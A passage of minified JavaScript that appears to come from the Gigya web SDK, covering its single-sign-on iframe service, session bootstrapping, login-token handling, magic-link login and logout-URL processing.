        return e.getInstance = function (t) {
          return void 0 === t && (t = window.gigya.partnerSettings.ssoKey), n.__awaiter(this, void 0, void 0, function () {
            var i, a, c, l;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return this._instance ? [3, 7] : t ? [3, 1] : [2, null];
                case 1:
                  if (!s.FlagService.loadSsoFrameOnlyOnce) return [3, 6];
                  i = window.gigya.utils.keyValue.serialize({
                    APIKey: t,
                    version: window.gigya.build.version,
                    build: window.gigya.build.number || -1,
                    sourceKey: window.gigya.thisScript.APIKey,
                    oneFrame: !0,
                    origin: window.gigya.localInfo.protocol + "://" + document.location.hostname,
                    ssoSegment: window.gigya.partnerSettings.ssoSegment || ""
                  }), a = "https://" + r.getStorageDomain() + "/gs/sso.htm?" + i, n.label = 2;
                case 2:
                  return n.trys.push([2, 4,, 5]), [4, (c = new u.ServiceProxy(a)).init("SSO")];
                case 3:
                  return n.sent(), this._instance = c.wrapWith(o.Sso), [3, 5];
                case 4:
                  return l = n.sent(), window.gigya.logger.error("error initialize sso frame", {
                    scope: "SsoService.init",
                    error: l
                  }), this._instance = new e(), [3, 5];
                case 5:
                  return [3, 7];
                case 6:
                  this._instance = new e(), n.label = 7;
                case 7:
                  return [2, this._instance];
              }
            });
          });
        }, e.prototype.checkTokenRenew = function (e) {
          return new gigya.Promise(function (t) {
            w({
              loginToken: e,
              callback: t
            });
          });
        }, e.prototype.getToken = function () {
          return new gigya.Promise(function (e) {
            d({
              callback: e
            });
          });
        }, e.prototype.getTokenExpiration = function () {
          return new gigya.Promise(function (e) {
            v({
              callback: e
            });
          });
        }, e.prototype.logout = function () {
          return new gigya.Promise(function (e) {
            p({
              callback: e
            });
          });
        }, e.prototype.removeToken = function () {
          return new gigya.Promise(function (e) {
            h({
              callback: e
            });
          });
        }, e.prototype.setGroupContext = function (e) {
          return new gigya.Promise(function (t) {
            _({
              groupContext: e,
              callback: t
            });
          });
        }, e.prototype.setToken = function (e, t, i) {
          return new gigya.Promise(function (n) {
            f({
              lt: e,
              expiration: t,
              gltexp: i,
              callback: n
            });
          });
        }, e.prototype.setTokenExpiration = function (e, t) {
          return void 0 === t && (t = !0), new gigya.Promise(function (i) {
            y({
              loginTokenExp: e,
              callback: i
            }, t);
          });
        }, e.prototype.syncCanaryIndication = function (e, t) {
          return new gigya.Promise(function (i) {
            m({
              isCanary: e,
              canaryVersion: t,
              callback: i
            });
          });
        }, e.prototype.getGroupApiDomain = function () {
          return new gigya.Promise(function (e) {
            S({
              callback: e
            });
          });
        }, e.prototype.setGroupApiDomain = function (e) {
          return new gigya.Promise(function (t) {
            b({
              callback: t,
              domain: e
            });
          });
        }, e;
      }();
      function g(e, i) {
        if (window.gigya.partnerSettings.ssoKey) {
          var n, o, u;
          n = i ? window.gigya.utils.object.clone(i) : {};
          var l = function (e) {
            window.gigya.logger.debug("cleaning sso iframe"), o.parentNode.removeChild(o), clearTimeout(u), e && (e.errorCode && "string" == typeof e.errorCode && (e.errorCode = Number(e.errorCode)), e.expires_in && "string" == typeof e.expires_in && (e.expires_in = Number(e.expires_in))), i && i.callback && i.callback(e);
          };
          n.m = e, n.d = window.gigya.localInfo.protocol + "://" + document.location.hostname, document.location.port && (n.d += ":" + document.location.port), n.callbackID = "gig_sso_cb" + new Date().getTime() + "_" + c++, n.sAPIKey = window.gigya.thisScript.APIKey, n[window.gigya.logger.configKey] = JSON.stringify(window.gigya.logger.getConfig());
          var g = window.gigya.utils.keyValue.serialize(n),
            d = function (i) {
              void 0 === i && (i = 0), window.gigya.utils.xd.addMessageListener(n.callbackID, {}, !1, l, window.gigya._.MessagingMethod.PostMessage), o = function (e) {
                var t;
                s.FlagService.hideSSOFrame ? t = a.createIframe("SSO Frame") : (t = document.createElement("iframe"), window.gigya.localInfo.isIOS || window.gigya.localInfo.isIOSChrome || window.gigya.localInfo.isAndroid ? (t.style.width = "0px", t.style.height = "0px", t.style.display = "none") : (t.style.width = "30px", t.style.height = "10px", t.style.position = "absolute", t.style.top = "-1000px", t.style.left = "-1000px"));
                return t.id = "gig_sso_" + e, window.gigya.utils.functions.addSrcToIFrameIfNeeded(t), t;
              }(n.callbackID);
              var c = function () {
                u = setTimeout(function () {
                  i <= 0 ? window.gigya.logger.error("SSO Communication Timeout", {
                    IE11PrivateMode: window.gigya.localInfo.isIE11 && !window.indexedDB,
                    mode: e
                  }) : (window.gigya.utils.xd.removeMessageListener(n.callbackID), window.gigya.utils.DOM.removeElement(o), d(i - 1));
                }, t._requestTimeout);
                var a = window.gigya.utils.keyValue.serialize({
                  APIKey: window.gigya.partnerSettings.ssoKey,
                  ssoSegment: window.gigya.partnerSettings.ssoSegment || "",
                  version: window.gigya.build.version,
                  build: window.gigya.build.number || -1
                });
                o.src = "https://" + r.getStorageDomain() + "/gs/sso.htm?" + a + "#" + g, window.gigya.utils.DOM.removeEventListener(o, "load", c);
              };
              window.gigya.utils.DOM.addEventListener(o, "load", c), window.gigya.logger.debug("opening sso iframe", n), document.body ? window.gigya.utils.DOM.appendToBody(o) : window.gigya.utils.functions.invokeOnPageLoad(function () {
                return window.gigya.utils.DOM.appendToBody(o);
              });
            };
          d(3);
        } else i && i.callback && i.callback({});
      }
      function d(e) {
        window.gigya.logger.info("trying to get sso group login token"), g("getToken", {
          callback: function (i) {
            t._storedLoginTokenExp = i.gltexp, e && e.callback && e.callback(i);
          }
        });
      }
      function f(e) {
        e.gltexp || (e.gltexp = window.gigya.utils.cookie.get("gltexp_" + window.gigya.thisScript.APIKey)), g("setToken", e);
      }
      function p(e) {
        g("logout", e);
      }
      function h(e) {
        g("removeToken", e);
      }
      function y(e, i) {
        void 0 === i && (i = !0), i && t._storedLoginTokenExp && e.loginTokenExp === t._storedLoginTokenExp ? e.callback && e.callback({
          gltexp: t._storedLoginTokenExp
        }) : (t._storedLoginTokenExp = e.loginTokenExp, g("setLoginTokenExp", e));
      }
      function v(e) {
        g("getLoginTokenExp", e);
      }
      function w(e) {
        window.gigya.logger.info("verifying login token with sso group"), g("checkTokenRenew", e);
      }
      function m(e) {
        g("syncCanaryIndication", e);
      }
      function _(e) {
        g("setGroupContext", e);
      }
      function b(e) {
        g("setGroupApiDomain", e);
      }
      function S(e) {
        g("getGroupApiDomain", e);
      }
      t.SsoService = l, t._request = g, t.getGroupToken = d, t.setGroupToken = f, t.logout = p, t.removeGroupToken = h, t.setLoginTokenExp = y, t.getLoginTokenExp = v, t.checkTokenRenew = w, t.syncCanaryIndication = m, t.setGroupContextCookie = _, t.setGroupApiDomain = b, t.getGroupApiDomain = S;
    },
    317: function (e, t, i) {
      (function (e) {
        Object.defineProperty(t, "__esModule", {
          value: !0
        });
        var n = i(67),
          o = i(84),
          r = i(48),
          a = i(25),
          s = i(100),
          u = i(68),
          c = i(69),
          l = i(128),
          g = i(86),
          d = i(172),
          f = i(129),
          p = i(173),
          h = i(31),
          y = i(24),
          v = i(318);
        i(319), window.gigya.services || (window.gigya.services = {}), window.gigya.services.proxy || (window.gigya.services.proxy = {}), window.gigya.services.proxy.utils || (window.gigya.services.proxy.utils = {}), window.gigya._ || (window.gigya._ = {}), window.gigya._.apiAdapters || (window.gigya._.apiAdapters = {}), window.gigya._.apiAdapters.web || (window.gigya._.apiAdapters.web = {}), window.gigya._.apiAdapters.web.sso || (window.gigya._.apiAdapters.web.sso = {}), window.gigya._.apiAdapters.web.tokenStore || (window.gigya._.apiAdapters.web.tokenStore = {}), e(window.gigya.services.proxy, n, o, r), e(window.gigya.services.proxy.utils, a), e(window.gigya.services, s, u, c), e(window.gigya, g, l), e(window.gigya._.apiAdapters.web, d, f, p, v), e(window.gigya._.apiAdapters.web.sso, h), e(window.gigya._.apiAdapters.web.tokenStore, y);
      }).call(this, i(0).__assign);
    },
    318: function (e, t, i) {
      Object.defineProperty(t, "__esModule", {
        value: !0
      });
      var n = i(0),
        o = i(24),
        r = i(172),
        a = i(173),
        s = i(48),
        u = i(100),
        c = i(14),
        l = i(85),
        g = i(22),
        d = i(2),
        f = i(42),
        p = i(50),
        h = i(31),
        y = i(27),
        v = i(11),
        w = i(33);
      window.gigya.isGigya || (window.gigya.isGigya = !0), t.webAdapterName = "Web", t.newApiAdapter = function (e) {
        return new m(e, new c.CookieStorageAdapter());
      };
      var m = function () {
        function e(e, i) {
          this.adapterSettings = e, this._storage = i, this.name = t.webAdapterName, this._reBootstrapCount = 0;
        }
        return e.prototype.getStorage = function () {
          return this._storage;
        }, e.prototype.init = function (t, i) {
          var r, a;
          return void 0 === i && (i = 0), n.__awaiter(this, void 0, void 0, function () {
            var s, u, c, g, p, y, v, m, _, b, S, k, I, P;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return n.trys.push([0, 14,, 17]), s = l.GmidProvider.getGmidBootstrapIndicationToken(window.gigya), u = this.getStorage().getItem(e.bootstrapIndicationCookieName(window.gigya.thisScript.APIKey)), c = u === s, window.gigya.logger.info("has bootstrapped: " + c), g = window.gigya.logger.group("create api service"), p = this, [4, h.SsoService.getInstance()];
                case 1:
                  return p._ssoService = n.sent(), y = window.gigya._.apiAdapters.web, v = this, [4, this.createApiService(c)];
                case 2:
                  return y.apiService = v._apiService = n.sent(), g.end(), m = l.GmidProvider.shouldRegenerateGmid(window.gigya, this.hasSessionToken()), [4, this.bootstrapApiService(m)];
                case 3:
                  return n.sent(), window.gigya.utils.functions.createAlias("gigya.auth.loginToken.get", o.get), window.gigya.partnerSettings.ssoKey && window.gigya.canary && window.gigya.canary.config.probability && this.syncCanaryWithSSO(), [4, this.establishSession()];
                case 4:
                  return (_ = n.sent()) && window.gigya.services.accountService.verifyLogin().then(function (e) {
                    e || window.gigya.events.global.dispatch({
                      eventName: "logout,accounts.logout"
                    });
                  }), [4, this.checkReturnFromURL()];
                case 5:
                  if (n.sent(), !window.gigya._.isTrustedDomain) try {
                    this._apiService.sendReport("untrusted domain", {
                      domain: location.hostname,
                      trustedDomains: window.gigya.partnerSettings.baseDomains
                    });
                  } catch (e) {
                    console.error(e);
                  }
                  return window.gigya.logger.info("user is " + (_ ? "" : "not ") + "logged-in"), window.gigya.partnerSettings.ssoKey ? [3, 6] : (t(), [3, 13]);
                case 6:
                  return window.gigya.logger.info("sso group sync - " + window.gigya.partnerSettings.ssoKey), b = function (e) {
                    o.setFromSsoResponse(e), t();
                  }, f.sessionData.isSessionVerified(o.get()) && _ && d.FlagService.useSessionVerify ? [4, w.promisify(window.gigya.accounts.session.verify, {
                    ignoreApiQueue: !0
                  })] : [3, 8];
                case 7:
                  S = n.sent(), _ = 0 === S.errorCode, n.label = 8;
                case 8:
                  return _ ? [4, null === (r = this._ssoService) || void 0 === r ? void 0 : r.checkTokenRenew(o.get())] : [3, 10];
                case 9:
                  return k = n.sent(), [3, 12];
                case 10:
                  return [4, null === (a = this._ssoService) || void 0 === a ? void 0 : a.getToken()];
                case 11:
                  k = n.sent(), n.label = 12;
                case 12:
                  b(k), n.label = 13;
                case 13:
                  return [3, 17];
                case 14:
                  return I = n.sent(), i > 0 ? [4, this.init(t, i - 1)] : [3, 16];
                case 15:
                  return [2, n.sent()];
                case 16:
                  return window.gigya.logger.error("error bootstrapping sdk", {
                    type: "bootstrap failed",
                    scope: "WebAdapter.init",
                    error: I
                  }), window.gigya.logger.debug("removing bootstrap indication"), this.getStorage().removeItem(e.bootstrapIndicationCookieName(window.gigya.thisScript.APIKey)), P = {
                    status: "FAIL_TO_BOOTSTRAP",
                    statusMessage: "Web SDK failed to bootstrap",
                    errorCode: 500026,
                    errorMessage: "Web SDK failed to bootstrap: " + (I.message || I)
                  }, window.gigya.events.dispatchErrorFromResponse({
                    eventName: "init"
                  }, P), window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], P), t(), [3, 17];
                case 17:
                  return [2];
              }
            });
          });
        }, e.prototype.bootstrapApiService = function (e) {
          return void 0 === e && (e = !1), n.__awaiter(this, void 0, void 0, function () {
            var t, i;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return n.trys.push([0, 2,, 3]), [4, this._apiService.bootstrap(e)];
                case 1:
                  return t = n.sent(), [3, 3];
                case 2:
                  return i = n.sent(), window.gigya.logger.error("error bootstrapping sdk", {
                    type: "webSdkBootstrap failed",
                    scope: "ApiService.bootstrap",
                    ex: i
                  }), window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], {
                    status: "FAIL_TO_BOOTSTRAP",
                    statusMessage: "Web SDK bootstrap failure - APIService bootstrap",
                    errorCode: 500026,
                    errorMessage: "Web SDK bootstrap failure: " + (i.message || i)
                  }), [3, 3];
                case 3:
                  return (null == t ? void 0 : t.ticketInfo) ? this.setGmidTicket(t.ticketInfo) : (null == t ? void 0 : t.hasGmid) && (this.bootstrapIndication = t.hasGmid, p.siteData.didForcedBootstrap = d.FlagService.forceWebSdkBootstrap ? t.hasGmid : null), [2];
              }
            });
          });
        }, e.prototype.syncCanaryWithSSO = function () {
          var e;
          return n.__awaiter(this, void 0, void 0, function () {
            var t, i, o;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return t = this.getStorage().getItem(window.gigya.canary.config.cookiesNames.isCanary), i = this.getStorage().getItem(window.gigya.canary.config.cookiesNames.version), [4, null === (e = this._ssoService) || void 0 === e ? void 0 : e.syncCanaryIndication(t, i)];
                case 1:
                  return 0 === (null == (o = n.sent()) ? void 0 : o.errorCode) && (o.isCanary && o.isCanary !== t && this.getStorage().setItem(window.gigya.canary.config.cookiesNames.isCanary, o.isCanary), o.canaryVersion && o.canaryVersion !== i && this.getStorage().setItem(window.gigya.canary.config.cookiesNames.version, o.canaryVersion)), [2];
              }
            });
          });
        }, e.prototype.createApiService = function (e) {
          return n.__awaiter(this, void 0, void 0, function () {
            var t, i, o, r, a, c, l, f;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return t = window.gigya.thisScript.globalConf.storageProtocolOverride || "https", i = window.gigya.logger.configKey + "=" + encodeURIComponent(JSON.stringify(window.gigya.logger.getConfig())), o = t + "://" + g.getStorageDomain() + "/gs/webSdk/Api.aspx?apiKey=" + encodeURIComponent(window.gigya.thisScript.APIKey) + "&version=" + window.gigya.build.version + "&build=" + window.gigya.build.number + "#origin=" + document.location.href + "&" + i, window.gigya.logger.info("opening api frame"), r = new s.ServiceProxy(o), window.gigya.logger.info("creating api service"), [4, r.init("Api Service")];
                case 1:
                  if (a = n.sent(), window.gigya.partnerSettings.plugins.apiDomain = a.apiDomain, window.gigya._.getApiDomain = window.gigya._.apiDomainFactory(a.apiDomain, window.gigya.defaultApiDomain), c = window.gigya._.Uri.parse(a.apiDomain), window.gigya.logger.info("api domain is: " + c), window.gigya.logger.info("api domain is " + (a.isGroupApiDomain ? "" : "not ") + "group domain"), l = "false" === window.gigya.thisScript.URLParams.bootstrap, !c.isBaseOf(o) || l || window.gigya.thisScript.globalConf.storageDomainOverride) {
                    if (window.gigya.logger.info("closing api frame"), r.stop(!0).then(function () {
                      return window.gigya.logger.info("api frame closed");
                    }), l ? e = !0 : a.hasGroupApiDomainChanged && (e = !1), f = !0, d.FlagService.alwaysCheckCookieSave) try {
                      f = window.gigya._.Uri.parse(window.gigya.localInfo.baseDomain || "").isBaseOf(c.domain);
                    } catch (e) {
                      window.gigya.logger.report("Error evaluating first party domain", {
                        baseDomain: window.gigya.localInfo.baseDomain,
                        apiDomain: c.domain
                      });
                    }
                    return window.gigya.logger.info("create and work with api service from top frame"), [2, new u.ApiService(window.gigya.thisScript.APIKey, e, {
                      originDomain: location.href,
                      isGroupApiDomain: a.isGroupApiDomain,
                      getApiDomain: window.gigya._.getApiDomain,
                      isApiDomainFirstParty: f,
                      hasGroupApiDomainChanged: !1,
                      canSaveGmidAsCookie: a.canSaveGmidAsCookie
                    })];
                  }
                  return window.gigya.logger.info("api domain is gigya's so keep working with frame"), [2, r.wrapWith(u.ApiService)];
              }
            });
          });
        }, e.prototype.isSessionValid = function (e, t) {
          var i = this;
          void 0 === e && (e = {}), o.setFromGAC(e, function () {
            t && t(i.hasSessionToken(e));
          });
        }, e.prototype.hasSessionToken = function (e) {
          return void 0 === e && (e = {}), null != o.get(e.APIKey) || null != e.oauth_token;
        }, e.prototype.registerForNamespaceEvents = function (e) {}, e.prototype.onPluginEvent = function (e) {}, e.prototype.onJSLog = function (e, t) {}, e.prototype.sendRequest = function (e, t, i, o) {
          return void 0 === o && (o = {}), n.__awaiter(this, void 0, void 0, function () {
            var a,
              s,
              u,
              c = this;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return [4, this.beforeRequest(e, t, o)];
                case 1:
                  return n.sent(), a = function (e, t) {
                    c.afterResponse(u, e, function () {
                      "function" == typeof t && t(window.gigya.utils.object.clone(e, !0));
                    });
                  }, s = function (e) {
                    a(e, i);
                  }, (u = new r.ApiRequest(e, t, s, o)).send(), window.gigya._.logoutMethods[e] && window.gigya._.logoutBehaviour.logoutBeforeServerResponse && this.clearSession(t), [2];
              }
            });
          });
        }, e.prototype.clearSession = function (e, t) {
          o.remove(e.APIKey), t && t();
        }, e.prototype.setGltexpFromSSO = function (e) {
          var t;
          return void 0 === e && (e = window.gigya.thisScript.APIKey), n.__awaiter(this, void 0, void 0, function () {
            var e;
            return n.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return !window.gigya.partnerSettings.ssoKey || o.isValidGltExp() ? [3, 2] : [4, null === (t = this._ssoService) || void 0 === t ? void 0 : t.getTokenExpiration()];
                case 1:
                  if (0 === (null == (e = i.sent()) ? void 0 : e.errorCode) && e.gltexp && o.isValidGltExp(e.gltexp)) return o.setGltexp(e.gltexp), [2, !0];
                  i.label = 2;
                case 2:
                  return [2, !1];
              }
            });
          });
        }, e.prototype.sendOauthRequest = function (e, t, i, n) {
          var o = this;
          this.beforeRequest(e, t, n);
          var r = "https://" + window.gigya._.getApiDomain("socialize"),
            s = new a.OauthRequest("", r, e, t, function (e) {
              o.afterResponse(s, e, function (e) {
                "0" != e.errorCode ? i(e) : o.bootstrapApiService().then(function () {
                  return i(e);
                });
              });
            }, n);
          s.send();
        }, e.prototype.beforeRequest = function (e, t, i) {
          var r, a;
          return void 0 === i && (i = {}), n.__awaiter(this, void 0, void 0, function () {
            return n.__generator(this, function (n) {
              return (i.clearSession || i.clearSessionCondition && i.clearSessionCondition(t)) && (window.gigya.logger.info("clearing session before request for " + e), o.remove(t.APIKey)), -2 === Number(t.sessionExpiration) && (null === (a = null === (r = window.gigya.thisScript) || void 0 === r ? void 0 : r.globalConf) || void 0 === a ? void 0 : a.storageDomainOverride) && (window.gigya.logger.info("session expiration -2 was converted to 1 year fixed expiration"), t.sessionExpiration = window.gigya.utils.cookie.getInfiniteExpirationTimeInSeconds()), [2];
            });
          });
        }, e.prototype.afterResponse = function (e, t, i) {
          return n.__awaiter(this, void 0, void 0, function () {
            var o = this;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return "Missing cookie" == t.errorDetails || "Session is invalid (Missing DeviceId)" == t.errorDetails || "Missing required parameter: gcid or ucid cookie" == t.errorDetails || 400006 === t.errorCode && "missingKey" === t.errorFlags ? (window.gigya.logger.info("missing cookie error - forcing bootstrap"), this._reBootstrapCount >= 2 ? (window.gigya.logger.report("multiple reBootstrap error"), this._reBootstrapCount = 0, i(t), [2]) : (this._reBootstrapCount++, [4, this.bootstrapApiService(!0)])) : [3, 2];
                case 1:
                  return n.sent(), window.gigya.logger.info("resending request"), e.send(), [2];
                case 2:
                  this._reBootstrapCount = 0, this.handleTokenResponse(e, t, function () {
                    o.logoutSsoIfNeeded(e, t, function () {
                      i(t);
                    });
                  }), n.label = 3;
                case 3:
                  return [2];
              }
            });
          });
        }, e.prototype.onSDKEvent = function (e) {}, e.prototype.getTokenParam = function (e, t) {
          return o.getTokenParam(e, t);
        }, e.prototype.establishSession = function () {
          return n.__awaiter(this, void 0, void 0, function () {
            var e,
              t = this;
            return n.__generator(this, function (i) {
              switch (i.label) {
                case 0:
                  return "sso.login" !== (e = window.gigya.utils.URL.getParamsFromURL(document.location.href)).gig_actions || this.hasSessionToken() || !e.authCode ? [3, 2] : [4, o.setFromAuthCode(e.authCode)];
                case 1:
                  return i.sent(), [2, this.hasSessionToken()];
                case 2:
                  return [4, new gigya.Promise(function (e) {
                    return t.isSessionValid(void 0, function (t) {
                      return e(t);
                    });
                  })];
                case 3:
                  return [2, i.sent()];
              }
            });
          });
        }, e.prototype.checkReturnFromURL = function () {
          var e;
          return n.__awaiter(this, void 0, void 0, function () {
            var t,
              i,
              r,
              a,
              s,
              u = this;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return t = window.gigya.utils.URL.getParamsFromURL(document.location.href), i = new RegExp(v.GIGYA_INTERNAL_PARAM_PREFIX + "|" + v.GIGYA_PARAM_PREFIX), r = window.gigya.utils.object.removePropertiesPrefix(t, i), "sso.login" !== (a = t.gig_actions) || t.authCode || this.syncSsoLogin(r), "magicLink" !== a ? [3, 2] : [4, this.handleMagicLink(r)];
                case 1:
                  n.sent(), n.label = 2;
                case 2:
                  return "confirmInvite" === a && y.checkGroupInvitation(r), t.gig_events ? (200009 == t.errorCode && window.gigya.accounts.finalizeRegistration({
                    regToken: t.regToken,
                    callback: function () {
                      var e;
                      return null === (e = u._ssoService) || void 0 === e ? void 0 : e.setToken(o.get(), t.expires_in);
                    }
                  }), 0 != t.errorCode || null == o.get() ? [3, 4] : (window.gigya.logger.info("returned from redirection with error code"), [4, null === (e = this._ssoService) || void 0 === e ? void 0 : e.setToken(o.get(), t.expires_in)])) : [2];
                case 3:
                  n.sent(), s = t.gig_events.split(","), -1 !== window.gigya.utils.array.indexOf(s, "accounts.login") ? window.gigya.accounts.getAccountInfo({
                    extraProfileFields: "samlData",
                    include: window.gigya.utils.stringUtils.mergeCommaSeparatedValues("profile,data,userinfo", window.gigya.thisScript.globalConf.include),
                    callback: function (e) {
                      var t = {
                        errorCode: 0,
                        eventName: "accounts.login"
                      };
                      if (window.gigya.utils.object.extractProperties(e, t, "signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|profile|data|id_token"), window.gigya.events.global.dispatchWhenHandlerAdded(t), -1 !== window.gigya.utils.array.indexOf(s, "socialize.login")) {
                        var i = window.gigya._.addUserInfoToEvent(e, {
                          errorCode: 0,
                          eventName: "socialize.login"
                        }, !0);
                        window.gigya.events.global.dispatchWhenHandlerAdded(i);
                      }
                    }
                  }) : window.gigya.socialize.getUserInfo({
                    signIDs: !0,
                    extraFields: "samlData",
                    callback: function (e) {
                      for (var t = 0; t < s.length; t++) {
                        var i = window.gigya._.addUserInfoToEvent(e, {
                          errorCode: 0,
                          eventName: s[t]
                        }, !0);
                        window.gigya.events.global.dispatchWhenHandlerAdded(i);
                      }
                    }
                  }), n.label = 4;
                case 4:
                  return [2];
              }
            });
          });
        }, e.prototype.handleMagicLink = function (e) {
          return n.__awaiter(this, void 0, void 0, function () {
            return n.__generator(this, function (t) {
              return [2, new gigya.Promise(function (t) {
                window.gigya.accounts.auth.magiclink.email.login(n.__assign(n.__assign({}, e), {
                  ignoreApiQueue: !0,
                  callback: function (e) {
                    0 !== (null == e ? void 0 : e.errorCode) && window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], e), t();
                  }
                }));
              })];
            });
          });
        }, e.prototype.setNewLoginTokenFromResponse = function (t, i, r) {
          var a;
          return n.__awaiter(this, void 0, void 0, function () {
            var s, u, c, l;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return (s = i.sessionInfo ? i.sessionInfo.login_token : i.login_token) ? this.isFakeToken(s) ? (window.gigya.logger.info("fake login token returned (no gmid) - forcing bootstrap"), [4, this.bootstrapApiService(!0)]) : [3, 2] : [3, 6];
                case 1:
                  return n.sent(), window.gigya.logger.info("resending the login request"), t.send(), [2];
                case 2:
                  return u = null != i.sessionInfo ? i.sessionInfo.expires_in : i.expires_in, c = t.params.sessionExpiration, (!u || 0 == u) && c < 0 && (u = window.gigya.utils.cookie.getInfiniteExpirationTimeInSeconds()), l = t.params.APIKey, window.gigya.utils.toggles.isOn(e.serverGltToggleName) ? this.setLoginTokenIfNotExist(l, s, u, c) : o.set(l, s, u, c), this.getStorage().removeItem("gltexp_" + t.params.APIKey), window.gigya.legacyReports.trackAddressBarShares(), window.gigya.partnerSettings.ssoKey && d.FlagService.setGroupApiDomainAfterLogin ? [4, this._ssoService.setGroupApiDomain(window.gigya._.getApiDomain())] : [3, 4];
                case 3:
                  n.sent(), n.label = 4;
                case 4:
                  return [4, null === (a = this._ssoService) || void 0 === a ? void 0 : a.setToken(s, u)];
                case 5:
                  n.sent(), n.label = 6;
                case 6:
                  return r(), [2];
              }
            });
          });
        }, e.prototype.setLoginTokenIfNotExist = function (e, t, i, n) {
          o.get(e) && o.get(e) === t ? window.gigya.logger.info("glt cookie was set by server", {
            login_token: t
          }) : (o.set(e, t, i, n), window.gigya.logger.info("glt cookie was set by javascript", {
            login_token: t
          }));
        }, e.prototype.isFakeToken = function (e) {
          return "ffs" == e.split(".")[1];
        }, e.prototype.onInvalidTokenResponse = function (e, t) {
          var i;
          return n.__awaiter(this, void 0, void 0, function () {
            var r;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return e.paramsLoginToken ? (t(), [2]) : [4, null === (i = this._ssoService) || void 0 === i ? void 0 : i.getToken()];
                case 1:
                  return (r = n.sent()) && r.login_token && r.login_token.split("|")[0] !== e.sentLoginToken && !e.paramsLoginToken ? [4, this.bootstrapApiService()] : [3, 3];
                case 2:
                  return n.sent(), o.setFromSsoResponse(r, e.params.APIKey), e.params.login_token = void 0, e.send(), [3, 4];
                case 3:
                  o.remove(e.params.APIKey), e.settings.requiresSession() ? t() : (delete e.params.login_token, delete e.sentLoginToken, e.send(t)), n.label = 4;
                case 4:
                  return [2];
              }
            });
          });
        }, e.prototype.handleTokenResponse = function (e, t, i) {
          var r;
          return n.__awaiter(this, void 0, void 0, function () {
            var a = this;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  if (403030 == (t = window.gigya.utils.object.clone(t)).errorCode) {
                    if (this.shouldWaitForService(e, t)) return [2];
                  } else 409012 == t.errorCode && (this._gmidTicket = null, window.gigya.utils.localStorage.removeItem("_gig_gmidt"));
                  return e.sentLoginToken && window.gigya._.logoutMethods[e.methodName] && 0 == t.errorCode && t.logoutActiveSession && this.clearSession(e.params), window.gigya.partnerSettings.ssoKey && e.sentLoginToken && 0 == t.errorCode && e.params.loginTokenExp && (null === (r = this._ssoService) || void 0 === r || r.setTokenExpiration(e.params.loginTokenExp)), this.hasSessionToken() || !t.authCode ? [3, 2] : [4, o.setFromAuthCode(t.authCode)];
                case 1:
                  return n.sent(), [3, 3];
                case 2:
                  this.setNewLoginTokenFromResponse(e, t, function () {
                    e.sentLoginToken && 403005 == t.errorCode ? a.onInvalidTokenResponse(e, i) : i();
                  }), n.label = 3;
                case 3:
                  return [2];
              }
            });
          });
        }, e.prototype.logoutSsoIfNeeded = function (e, t, i) {
          var o;
          return n.__awaiter(this, void 0, void 0, function () {
            var r, a;
            return n.__generator(this, function (n) {
              switch (n.label) {
                case 0:
                  return window.gigya.partnerSettings.ssoKey && window.gigya._.logoutMethods[e.methodName] && 0 == t.errorCode && t.logoutActiveSession ? document.location.href == window.gigya.partnerSettings.ssoLogoutUrl ? [3, 2] : [4, null === (o = this._ssoService) || void 0 === o ? void 0 : o.logout()] : [3, 4];
                case 1:
                  return r = n.sent(), a = void 0, void 0 !== e.params.sustainLogoutURLs && (a = !e.params.sustainLogoutURLs), this.loadLogoutUrls(r.logoutURLs, i, {
                    UID: t.UID,
                    UIDSignature: t.UIDSignature,
                    signatureTimestamp: t.signatureTimestamp
                  }, a), [3, 3];
                case 2:
                  i(), n.label = 3;
                case 3:
                  return [3, 5];
                case 4:
                  i(), n.label = 5;
                case 5:
                  return [2];
              }
            });
          });
        }, e.prototype.loadLogoutUrls = function (e, t, i, n) {
          for (var o = 0, r = e ? e.split(",") : [], a = function () {
              ++o > r.length && t();
            }, s = 0; s < r.length; s++) if (r[s]) {
            var u = window.gigya.utils.URL.addParamsToURL(r[s], i);
            this.loadLogoutUrl(u, a, n);
          } else a();
          a();
        }, e.prototype.loadLogoutUrl = function (e, t, i) {
          void 0 === i && (i = 5e3);
          var n = document.createElement("iframe");
          n.src = e, n.style.position = "absolute", n.style.top = "-1000px", n.style.left = "-1000px";
          var o = !1,
            r = function () {
              o = !0, !1 !== i && n.parentElement.removeChild(n), t();
            };
          window.setTimeout(function () {
            o || r();
          }, i), n.onload = function () {
            r();
          }, window.gigya.utils.DOM.prependToBody(n);
        }, e.prototype.shouldWaitForService = function (e, t) {
          return !!e.params.retryPossible && (e.params.retryPossible = !1, window.gigya.external.facebook.runWhenLoaded(function () {
            e.send();
          }), !0);
        }, e.prototype.getGmidTicket = function () {
          return n.__awaiter(this, void 0, void 0, function () {
            return n.__generator(this, function (e) {
              return this._gmidTicket && this.refreshGmidTicket(), [2, this._gmidTicket];
            });
          });
        }, e.prototype.refreshGmidTicket = function () {
          var e = this;
          this._apiService.getGmidTicket(!0).then(function (t) {
            return e.setGmidTicket(t);
          });
        }, e.prototype.setGmidTicket = function (e) {
          var t = this;
          if (e && e.gmidTicket) {
            window.gigya.logger.info("set gmidTicket (set auto-refresh)"), this._gmidTicket = e.gmidTicket;
            var i = this.calculateGmidTicketNextRun(e.expirationTime);
            setTimeout(function () {
              return t.refreshGmidTicket();
            }, i);
          } else window.gigya.logger.info("clean gmidTicket"), delete this._gmidTicket;
        }, Object.defineProperty(e.prototype, "bootstrapIndication", {
          get: function () {
